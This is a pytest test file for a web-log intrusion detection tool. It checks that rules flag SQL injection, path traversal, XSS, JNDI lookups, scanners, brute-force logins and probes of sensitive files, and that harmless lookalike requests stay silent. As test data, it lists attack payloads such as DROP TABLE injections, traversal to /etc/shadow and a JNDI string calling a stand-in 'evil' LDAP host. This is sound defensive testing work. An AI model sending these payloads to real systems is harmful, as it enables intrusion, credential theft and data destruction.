import pytest
from urllib.parse import quote

from conftest import web
from logsentry.rules import Config, run_rules


def fire(events, rule, cfg=None):
    return [a for a in run_rules(events, cfg, only=[rule])]


SQLI_ATTACKS = ["/p?id=1' OR '1'='1", "/p?id=1 UNION SELECT user,pass FROM users--", "/p?id=1;DROP TABLE users",
                "/p?id=1 AND SLEEP(5)", "/p?id=1 OR 1=1", "/p?q=x' UNION ALL SELECT NULL--",
                "/p?id=1 AND 1=1", "/p?id=admin'--", "/p?id=1/**/UNION/**/SELECT/**/1",
                "/p?x=information_schema.tables", "/p?id=1;WAITFOR DELAY '0:0:5'"]
SQLI_HARMLESS = ["/search?q=select+shoes", "/search?q=union+square+hotels", "/search?q=drop+shipping+guide",
                 "/search?q=o%27reilly+books", "/search?q=fish+%26+chips", "/blog/sql-select-tips",
                 "/products?id=42", "/search?q=cats+and+dogs"]


@pytest.mark.parametrize("path", SQLI_ATTACKS)
def test_sqli_detected_raw_encoded_and_double_encoded(path):
    for variant in (path, quote(path, safe="/?=&"), quote(quote(path, safe="/?=&"), safe="/?=%&")):
        assert len(fire([web(path=variant)], "WEB-001")) == 1, variant


@pytest.mark.parametrize("path", SQLI_HARMLESS)
def test_sqli_ignores_harmless_lookalikes(path):
    assert fire([web(path=path)], "WEB-001") == []


def test_signature_alert_groups_a_burst_and_splits_on_a_quiet_gap():
    events = [web(t=0, path="/p?id=1 OR 1=1"), web(t=30, path="/p?id=2 OR 1=1"),
              web(t=30 + 901, path="/p?id=3 OR 1=1")]
    alerts = fire(events, "WEB-001")
    assert [a.count for a in alerts] == [2, 1]
    assert alerts[0].severity == "high" and alerts[0].ip == "198.51.100.9"


def test_signature_alerts_are_per_ip():
    events = [web(ip="1.1.1.1", path="/p?id=1 OR 1=1"), web(ip="2.2.2.2", path="/p?id=1 OR 1=1")]
    assert {a.ip for a in fire(events, "WEB-001")} == {"1.1.1.1", "2.2.2.2"}


@pytest.mark.parametrize("path", ["/d?file=../../etc/passwd", "/d?file=..%2f..%2fetc%2fpasswd",
                                  "/d?file=%252e%252e%252fetc%252fpasswd", "/d?file=..\\..\\boot.ini",
                                  "/d?file=php://filter/resource=index", "/d?f=/proc/self/environ", "/d?f=/etc/shadow"])
def test_traversal_detected(path):
    assert len(fire([web(path=path)], "WEB-002")) == 1


@pytest.mark.parametrize("path", ["/download?file=report..2026.pdf", "/blog/a..b", "/d?file=catalog.pdf", "/etc-guide"])
def test_traversal_ignores_dots_in_names(path):
    assert fire([web(path=path)], "WEB-002") == []


@pytest.mark.parametrize("path", ["/s?q=<script>alert(1)</script>", "/s?q=%3Cscript%3Ealert(1)%3C/script%3E",
                                  "/s?q=javascript:alert(1)", "/s?q=\"><img src=x onerror=alert(1)>",
                                  "/s?q=<svg onload=x>"])
def test_xss_detected(path):
    alerts = fire([web(path=path)], "WEB-003")
    assert len(alerts) == 1 and alerts[0].severity == "medium"


@pytest.mark.parametrize("path", ["/s?q=I+%3C3+you", "/s?q=javascript+tutorials", "/s?q=onerror+handling+in+python",
                                  "/s?q=alert+dialog+design"])
def test_xss_ignores_ordinary_searches(path):
    assert fire([web(path=path)], "WEB-003") == []


def test_jndi_in_path_and_user_agent():
    assert len(fire([web(path="/?x=${jndi:ldap://evil/a}")], "WEB-008")) == 1
    assert len(fire([web(ua="${jndi:ldap://evil/a}")], "WEB-008")) == 1
    assert len(fire([web(path="/?x=%24%7Bjndi:ldap://evil/a%7D")], "WEB-008")) == 1
    assert fire([web(path="/?x=${name}")], "WEB-008") == []


def test_scanner_user_agent_one_alert_per_ip():
    events = [web(t=i, ua="sqlmap/1.7.8#stable") for i in range(30)] + [web(ip="9.9.9.9", ua="Mozilla/5.0")]
    alerts = fire(events, "WEB-004")
    assert len(alerts) == 1 and alerts[0].count == 30 and "sqlmap" in alerts[0].summary


def missing(n, spacing=1, distinct=True):
    return [web(t=i * spacing, path="/x%d" % (i if distinct else 0), status=404) for i in range(n)]


def test_forced_browsing_threshold_boundary():
    assert fire(missing(14), "WEB-005") == []
    assert len(fire(missing(15), "WEB-005")) == 1


def test_forced_browsing_needs_distinct_paths_and_404s_and_a_short_window():
    assert fire(missing(40, distinct=False), "WEB-005") == []                      # same dead link, many times
    assert fire(missing(15, spacing=10), "WEB-005") == []                          # 15 paths over 140s
    assert fire([web(t=i, path="/x%d" % i, status=200) for i in range(30)], "WEB-005") == []


def login(t, status, method="POST", path="/login", ip="198.51.100.9"):
    return web(ip=ip, t=t, method=method, path=path, status=status)


def test_login_bruteforce_boundary_and_window():
    assert fire([login(i, 401) for i in range(9)], "WEB-006") == []
    alerts = fire([login(i, 401) for i in range(10)], "WEB-006")
    assert len(alerts) == 1 and alerts[0].severity == "high"
    assert fire([login(i * 7, 401) for i in range(10)], "WEB-006") == []          # 10 over 63s: outside the 60s window


def test_login_bruteforce_escalates_when_a_success_follows():
    events = [login(i, 401) for i in range(12)] + [login(60, 302)]
    alert = fire(events, "WEB-006")[0]
    assert alert.severity == "critical" and "successful login" in alert.summary
    assert alert.evidence[-1].endswith('"Mozilla/5.0"') and " 302 " in alert.evidence[-1]


def test_login_success_long_after_does_not_escalate():
    events = [login(i, 401) for i in range(12)] + [login(1000, 302)]
    assert fire(events, "WEB-006")[0].severity == "high"


def test_login_rule_ignores_gets_and_other_paths():
    assert fire([login(i, 401, method="GET") for i in range(20)], "WEB-006") == []
    assert fire([login(i, 401, path="/api/orders") for i in range(20)], "WEB-006") == []
    assert len(fire([login(i, 403, path="/Login?next=/") for i in range(10)], "WEB-006")) == 1


def test_sensitive_paths_severity_depends_on_what_the_server_said():
    assert fire([web(path="/.env", status=404)], "WEB-007")[0].severity == "medium"
    assert fire([web(path="/phpmyadmin/", status=200)], "WEB-007")[0].severity == "high"
    secret = fire([web(path="/.git/config", status=200)], "WEB-007")[0]
    assert secret.severity == "critical" and "secret file" in secret.summary


def test_sensitive_paths_ignores_normal_downloads():
    harmless = ["/downloads/catalog.zip", "/static/app.js", "/products", "/blog/env-variables-explained"]
    assert fire([web(path=p, status=200) for p in harmless], "WEB-007") == []


def test_ignore_networks_removes_trusted_sources():
    events = [login(i, 401, ip="10.20.1.1") for i in range(12)] + [login(i, 401, ip="203.0.113.7") for i in range(12)]
    alerts = run_rules(events, Config(ignore_networks=("10.20.0.0/16",)), only=["WEB-006"])
    assert [a.ip for a in alerts] == ["203.0.113.7"]
